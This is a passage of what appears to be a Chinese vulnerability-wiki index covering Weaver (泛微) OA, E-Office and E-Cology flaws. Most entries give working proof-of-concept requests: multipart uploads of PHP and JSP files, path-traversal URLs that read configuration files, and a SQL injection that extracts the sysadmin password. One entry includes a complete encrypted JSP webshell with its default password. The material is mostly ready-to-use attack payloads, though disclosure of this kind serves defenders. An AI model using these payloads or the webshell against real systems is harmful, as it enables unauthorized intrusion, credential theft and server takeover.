","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-e-office-officeserver.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-e-office-officeserver.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"泛微OA E-Office UploadFile.php 任意文件上传漏洞 CNVD-2021-49104 ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-e-office-uploadfile.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cnvd-2021-49104/:0:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-e-office-uploadfile.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cnvd-2021-49104/"},{"categories":null,"content":"漏洞描述 在/general/index/UploadFile.php中上传文件过滤不严格导致允许无限制地上传文件，攻击者可以通过该漏洞直接获取网站权限 ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-e-office-uploadfile.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cnvd-2021-49104/:1:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-e-office-uploadfile.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cnvd-2021-49104/"},{"categories":null,"content":"漏洞影响 泛微OA V8 ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-e-office-uploadfile.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cnvd-2021-49104/:2:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-e-office-uploadfile.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cnvd-2021-49104/"},{"categories":null,"content":"网络测绘 app=\"泛微-EOffice\" ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-e-office-uploadfile.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cnvd-2021-49104/:3:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-e-office-uploadfile.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cnvd-2021-49104/"},{"categories":null,"content":"漏洞复现 登录页面 发送请求包 POST /general/index/UploadFile.php?m=uploadPicture\u0026uploadType=eoffice_logo\u0026userId= HTTP/1.1 Host: User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36 Accept-Encoding: gzip, deflate Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Connection: close Accept-Language: zh-CN,zh-TW;q=0.9,zh;q=0.8,en-US;q=0.7,en;q=0.6 Cookie: LOGIN_LANG=cn; PHPSESSID=0acfd0a2a7858aa1b4110eca1404d348 Content-Length: 193 Content-Type: multipart/form-data; boundary=e64bdf16c554bbc109cecef6451c26a4 --e64bdf16c554bbc109cecef6451c26a4 Content-Disposition: form-data; name=\"Filedata\"; filename=\"test.php\" Content-Type: image/jpeg \u003c?php phpinfo();?\u003e --e64bdf16c554bbc109cecef6451c26a4-- 再访问 /images/logo/logo-eoffice.php ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-e-office-uploadfile.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cnvd-2021-49104/:4:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-e-office-uploadfile.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cnvd-2021-49104/"},{"categories":null,"content":"泛微OA E-Office uploadify 任意文件上传漏洞 ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-e-office-uploadify-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-e-office-uploadify-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 泛微OA E-Office 在 uploadify.php 中上传文件过滤不严格导致允许无限制地上传文件，攻击者可以通过该漏洞直接获取网站权限 ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-e-office-uploadify-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-e-office-uploadify-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 泛微OA E-Office10 ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-e-office-uploadify-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-e-office-uploadify-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"泛微-EOffice\" ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-e-office-uploadify-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-e-office-uploadify-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 \u003c?php include_once(\"inc/vulnerability.php\"); if (!empty($_FILES)) { $tempFile = $_FILES['Filedata']['tmp_name']; //获取扩展名 if (!strrpos($tempFile, \".\")) { echo \"\"; exit; } $fileExt = substr($tempFile, strrpos($tempFile, \".\") + 1); $attachmentID = createFileDir(); $uploadPath = $_REQUEST[\"uploadPath\"]; if (trim($uploadPath) == \"\") { $targetPath = $_SERVER['DOCUMENT_ROOT'] . '/attachment/' . $attachmentID; } else { $targetPath = $uploadPath . '/sent/attachment/' . $attachmentID; } if (!file_exists($targetPath)) { mkdir($targetPath, 0777, true); } $targetFile = str_replace('//', '/', $targetPath) . \"/\" . $_FILES['Filedata']['name']; isIllegalUploadFile($targetFile); move_uploaded_file($tempFile, iconv(\"UTF-8\", \"GBK\", $targetFile)); echo $attachmentID; } function createFileDir() { global $ATTACH_PATH; mt_srand((double) microtime() * 1000000); $RADOM_ID = mt_rand() + mt_rand(); if (!file_exists($ATTACH_PATH . $RADOM_ID)) return $RADOM_ID; else createFileDir(); } ?\u003e 验证POC POST /inc/jquery/uploadify/uploadify.php HTTP/1.1 Host: User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2656.18 Safari/537.36 Connection: close Content-Length: 259 Content-Type: multipart/form-data; boundary=e64bdf16c554bbc109cecef6451c26a4 Accept-Encoding: gzip --e64bdf16c554bbc109cecef6451c26a4 Content-Disposition: form-data; name=\"Filedata\"; filename=\"2TrZmO0y0SU34qUcUGHA8EXiDgN.php\" Content-Type: image/jpeg \u003c?php echo \"2TrZmO0y0SU34qUcUGHA8EXiDgN\";unlink(__FILE__);?\u003e --e64bdf16c554bbc109cecef6451c26a4-- 访问： /attachment/3466744850/xxx.php ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-e-office-uploadify-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-e-office-uploadify-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"泛微OA E-Office UserSelect 未授权访问漏洞 ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-e-office-userselect-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-e-office-userselect-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 泛微OA E-Office UserSelect接口存在未授权访问漏洞，通过漏洞攻击者可以获取敏感信息 ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-e-office-userselect-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-e-office-userselect-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 泛微OA E-Office ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-e-office-userselect-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-e-office-userselect-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"泛微-EOffice\" ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-e-office-userselect-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-e-office-userselect-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 验证POC /UserSelect/ ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-e-office-userselect-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-e-office-userselect-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"泛微OA E-Weaver SignatureDownLoad 任意文件读取漏洞 ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-e-weaver-signaturedownload-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-e-weaver-signaturedownload-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 泛微OA E-Weaver SignatureDownLoad接口存在任意文件读取漏洞，攻击者通过漏洞可以读取服务器任意文件 ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-e-weaver-signaturedownload-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-e-weaver-signaturedownload-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 泛微OA E-Weaver ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-e-weaver-signaturedownload-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-e-weaver-signaturedownload-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"泛微-E-Weaver\" ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-e-weaver-signaturedownload-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-e-weaver-signaturedownload-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 验证POC /weaver/weaver.file.SignatureDownLoad?markId=0%20union%20select%20%27C:/Windows/win.ini%27 /weaver/weaver.file.SignatureDownLoad?markId=0%20union%20select%20%27../ecology/WEB-INF/prop/weaver.properties%27 ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-e-weaver-signaturedownload-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-e-weaver-signaturedownload-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"泛微OA V8 getdata.jsp SQL注入漏洞 ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-getdata.jsp-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-getdata.jsp-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 泛微OA V8 存在SQL注入漏洞，攻击者可以通过漏洞获取管理员权限和服务器权限 ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-getdata.jsp-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-getdata.jsp-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 泛微OA V8 ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-getdata.jsp-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-getdata.jsp-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"泛微-协同办公OA\" ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-getdata.jsp-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-getdata.jsp-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 在getdata.jsp中，直接将request对象交给 weaver.hrm.common.AjaxManager.getData(HttpServletRequest, ServletContext) : 方法处理 在getData方法中，判断请求里cmd参数是否为空，如果不为空，调用proc方法 Proc方法4个参数，(“空字符串”,”cmd参数值”,request对象，serverContext对象) 在proc方法中，对cmd参数值进行判断，当cmd值等于getSelectAllId时，再从请求中获取sql和type两个参数值，并将参数传递进getSelectAllIds（sql,type）方法中 根据以上代码流程，只要构造请求参数 ?cmd= getSelectAllId\u0026sql=select password as id from userinfo; 即可完成对数据库操控 POC http://xxx.xxx.xxx.xxx/js/hrm/getdata.jsp?cmd=getSelectAllId\u0026sql=select%20password%20as%20id%20from%20HrmResourceManager 查询HrmResourceManager表中的password字段，页面中返回了数据库第一条记录的值（sysadmin用户的password） 解密后即可登录系统 ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-getdata.jsp-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-getdata.jsp-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"泛微OA ln.FileDownload 任意文件读取漏洞 ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-ln.filedownload-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-ln.filedownload-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 泛微OA ln.FileDownload 接口存在任意文件读取漏洞，攻击者通过漏洞可以获取服务器任意文件 ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-ln.filedownload-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-ln.filedownload-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 泛微OA V8 ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-ln.filedownload-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-ln.filedownload-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"泛微-协同办公OA\" ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-ln.filedownload-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-ln.filedownload-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登陆页面 验证POC /weaver/ln.FileDownload?fpath=../ecology/WEB-INF/web.xml ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-ln.filedownload-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-ln.filedownload-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"泛微OA sysinterfacecodeEdit.jsp 任意文件上传漏洞 ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-sysinterfacecodeedit.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-sysinterfacecodeedit.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 泛微OA sysinterface/codeEdit.jsp 页面任意文件上传导致可以上传恶意文件 ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-sysinterfacecodeedit.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-sysinterfacecodeedit.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞版本 较老版本，目前无准确版本 ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-sysinterfacecodeedit.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-sysinterfacecodeedit.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 filename=******5308.java\u0026filetype=javafilename为文件名称 为空时会自动创建一个 String fileid = \"Ewv\";\u003cbr\u003e String readonly = \"\";\u003cbr\u003e boolean isCreate = false;\u003cbr\u003e if(StringHelper.isEmpty(fileName)) {\u003cbr\u003e Date ndate = new Date();\u003cbr\u003e SimpleDateFormat sf = new SimpleDateFormat(\"yyyyMMddHHmmss\");\u003cbr\u003e String datetime = sf.format(ndate);\u003cbr\u003e fileid = fileid + datetime;\u003cbr\u003e fileName= fileid + \".\" + filetype;\u003cbr\u003e isCreate = true;\u003cbr\u003e } else {\u003cbr\u003e int pointIndex = fileName.indexOf(\".\");\u003cbr\u003e if(pointIndex \u003e -1) {\u003cbr\u003e fileid = fileName.substring(0,pointIndex);\u003cbr\u003e }} ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-sysinterfacecodeedit.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-sysinterfacecodeedit.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"参考文章 泛微OA未授权可导致GetShell ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-sysinterfacecodeedit.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-sysinterfacecodeedit.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"泛微OA uploadOperation.jsp 任意文件上传 ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-uploadoperation.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/:0:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-uploadoperation.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"categories":null,"content":"漏洞描述 泛微OA V9 存在文件上传接口导致任意文件上传 ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-uploadoperation.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/:1:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-uploadoperation.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"categories":null,"content":"漏洞影响 泛微OA V9 ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-uploadoperation.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/:2:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-uploadoperation.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"categories":null,"content":"漏洞复现 漏洞位于: /page/exportImport/uploadOperation.jsp文件中 Jsp流程大概是:判断请求是否是multipart请求,然就没有了,直接上传了,啊哈哈哈哈哈 重点关注File file=new File(savepath+filename), Filename参数,是前台可控的,并且没有做任何过滤限制 利用非常简单,只要对着 /page/exportImport/uploadOperation.jsp 来一个multipartRequest就可以 然后请求 然后请求路径: page/exportImport/fileTransfer/1.jsp 请求包 POST /page/exportImport/uploadOperation.jsp HTTP/1.1 Host: xxx.xxx.xxx.xxx Content-Length: 397 Pragma: no-cache Cache-Control: no-cache Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36 Edg/89.0.774.68 Origin: null Content-Type: multipart/form-data; boundary=----WebKitFormBoundary6XgyjB6SeCArD3Hc Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6 dnt: 1 x-forwarded-for: 127.0.0.1 Connection: close ------WebKitFormBoundary6XgyjB6SeCArD3Hc Content-Disposition: form-data; name=\"file\"; filename=\"test.jsp\" Content-Type: application/octet-stream \u003c%@page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"%\u003e\u003c%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%\u003e\u003c%if (request.getMethod().equals(\"POST\")){String k=\"e45e329feb5d925b\";session.putValue(\"u\",k);Cipher c=Cipher.getInstance(\"AES\");c.init(2,new SecretKeySpec(k.getBytes(),\"AES\"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%\u003e ------WebKitFormBoundary6XgyjB6SeCArD3Hc-- 地址: /page/exportImport/fileTransfer/test.jsp 默认密码 rebeyond ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-uploadoperation.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/:3:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-uploadoperation.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"categories":null,"content":"泛微OA v9 E-Cology browser.jsp SQL注入漏洞 ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-v9-e-cology-browser.jsp-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-v9-e-cology-browser.jsp-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 泛微OA E-Cology browser.jsp 存在SQL注入漏洞，攻击者通过漏洞可以获取数据库敏感信息，进一步进行攻击 ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-v9-e-cology-browser.jsp-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-v9-e-cology-browser.jsp-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 泛微 E-Cology v9 ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-v9-e-cology-browser.jsp-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-v9-e-cology-browser.jsp-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 product=\"泛微-协同商务系统\" 